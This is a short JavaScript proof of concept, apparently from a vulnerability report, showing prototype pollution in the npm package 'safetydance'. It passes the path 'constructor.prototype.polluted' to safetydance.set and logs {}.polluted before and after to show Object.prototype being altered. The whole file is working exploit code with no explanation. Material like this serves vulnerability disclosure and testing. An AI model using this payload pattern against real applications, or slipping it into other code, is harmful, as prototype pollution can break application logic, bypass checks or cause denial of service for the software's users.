var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const safetydance = require('safetydance');
obj = {};
console.log({}.polluted);
safetydance.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);